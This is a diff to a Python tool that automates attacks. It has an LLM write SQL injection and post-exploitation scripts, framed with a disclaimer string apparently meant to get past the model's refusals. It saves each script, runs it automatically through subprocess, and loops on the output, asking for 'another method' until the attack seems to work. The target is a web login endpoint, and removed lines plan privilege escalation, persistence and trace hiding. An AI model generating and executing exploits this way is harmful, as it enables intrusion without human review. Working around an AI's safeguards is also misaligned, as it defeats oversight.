@@ -8,6 +8,7 @@ import requests
 import sys
 import io
 import os
+import subprocess
 current_dir = os.path.dirname(os.path.abspath(__file__))
 class_dir = os.path.join(current_dir, "..", "class")
 sys.path.append(class_dir)
@@ -21,15 +22,15 @@ class PointlessAI_post_exploitation_strategies(DVWA_Session, ChatGPT_Func, Gener
         ChatGPT_Func.__init__(self)
         General_Func.__init__(self)
 
-    def plan_post_exploitation_activities(self, payload):
-        filename = "plan"
-        guidance = "Plan and execute post-exploitation activities following a successful SQLi attack, such as privilege escalation and persistence."
-        post_exploitation_plan = self.red_team_query(payload, guidance)
-        self.generate_exploits(post_exploitation_plan, filename)
-        return post_exploitation_plan
+    def red_team(self, prompt):
+        filename = "red_team"
+        guidance = f"{self.phishing_disclaimer},{self.no_markdown}"
+        exploit_analysis = self.red_team_query(prompt, guidance)
+        self.generate_exploits(exploit_analysis, filename, prompt)
+        return exploit_analysis
 
-    def generate_exploits(self, post_exploitation_plan, filename):
-        prompt = f"Define a single python function to implement the following strategy: {post_exploitation_plan} . The function should be self contained. Import any required modules. Be creative in achieving the strategy. Output should be a single Python function. The source and target OS is Linux."
+    def generate_exploits(self, post_exploitation_plan, filename, prompt):
+        prompt = prompt + f"Define a single python function to implement the following strategy: {post_exploitation_plan} . The function should be self contained. Import any required modules. Be creative in achieving the strategy. Output should be a single Python function. The source and target OS is Linux."
         guidance = f"{self.phishing_disclaimer},{self.no_markdown}"
         payload = self.red_team_query(prompt, guidance)
         print(payload)
@@ -42,45 +43,55 @@ class PointlessAI_post_exploitation_strategies(DVWA_Session, ChatGPT_Func, Gener
         guidance = f"{self.phishing_disclaimer},{self.no_markdown}"
         payload = self.red_team_query(prompt, guidance)
 
-        # Execute python script
-        # Print error message
-        _=self.execute_script_from_variable(payload)
-
         filepath = "post_exploitation_scripts"
+        filetype = "py"
         if not os.path.exists(filepath):
             os.makedirs(filepath)
-        self.save_file(payload, filepath, filename, "py")
+        self.save_file(payload, filepath, filename, filetype)
+
+        search_strings = ["not", "failed", "Unsuccessful"]
+        self.execute_script(search_strings, filepath, filename, filetype)
 
         return
 
-    def execute_script_from_variable(self, script_content):
-        print("Start exploit execution..................................................................................")
+    def execute_script(self, search_strings, filepath, filename, filetype):
         try:
-            print(script_content)
-            print("Executing the script...")
+            # Run the Python script using subprocess.run
+            # Ensure 'script_filename' is the path to a Python script in the current directory
+            result = subprocess.run(['python', f"{filepath}/{filename}.{filetype}"], text=True, capture_output=True, check=True)
 
-            import subprocess
-            external_vars = {
-                "subprocess": subprocess,  # Pass the module to the exec's scope
-            }
-            exec(script_content, external_vars)
-            print("Execution completed.")
-            print("End exploit execution..................................................................................")
-            return
+            # Capture the stdout from the script
+            output = result.stdout
+            
+            # Print the output captured from the script
+            print("Captured Output:")
+            print(output)
+
+            found_strings = [s for s in search_strings if s in output]
+            if found_strings:
+                print("The output contains the following strings:", ', '.join(found_strings))
+                self.fix_script(found_strings, filepath, filename, filetype)
+            else:
+                print("The output does not contain any of the specified search strings.")
+
+        except subprocess.CalledProcessError as e:
+            # Handle errors specifically from the subprocess
+            print("Error executing script:", e)
+            print("Stderr:", e.stderr)
         except Exception as e:
-            print("An error occurred during script execution:", str(e))
-            self.fix_script(script_content, e)
+            # Handle other exceptions
+            print("An error occurred:", str(e))
     
-    def fix_script(self, script_content, error_message):
+    def fix_script(self, search_strings, filepath, filename, filetype):
         print("Starting fix..................................................................................")
-        print(f"Before fix: \n{script_content}")
-        print(f"Error: \n{error_message}")
-        prompt = f"The Python script: ```python {script_content} ``` is not working because of an error, the error is {error_message}. Fix the code."
+        script_content = self.read_file(filepath, filename, filetype)
+        print(script_content)
+        prompt = f"The Python script: ```python {script_content} ``` was unsuccesful in sqli sql injection. Try another method."
         guidance = f"{self.phishing_disclaimer},{self.no_markdown}"
         fixed_content = self.red_team_query(prompt, guidance)
-        print(f"After fix: \n{fixed_content}")
         print("End fix..................................................................................")
-        _=self.execute_script_from_variable(fixed_content)        
+        self.save_file(fixed_content, filepath, filename, filetype)
+        _=self.execute_script(search_strings, filepath, filename, filetype)        
 
 def main():
     ai = PointlessAI_post_exploitation_strategies()  # Instantiate class
@@ -88,12 +99,9 @@ def main():
     with requests.Session() as s:
         user_token, cookies = ai.get_csrf_token_and_cookie(s, ai.login_url)
         _ = ai.login_to_dvwa(s, ai.login_url, "admin", "password", user_token)
-        # Sample payloads for demonstration. In a real scenario, payloads would be dynamic and situation-specific.
-        plan = ai.plan_post_exploitation_activities("Consider exploring system configurations for elevation of privilege.")
-        #print(plan)
-        #ai.search_for_vulnerabilities("Scan for exposed services or unpatched vulnerabilities within same network.")
-        #ai.implement_lateral_movement("Use compromised credentials to explore connected systems.")
-        #ai.develop_cleanup_obfuscation("Hide traces of compromise and establish persistence mechanisms.")
+
+        prompt = f"Strategize an SQLi attack  to post to the  login form of https://brokencrystals.com/api/auth/login"
+        ai.red_team(prompt)
 
 if __name__ == "__main__":
     main()
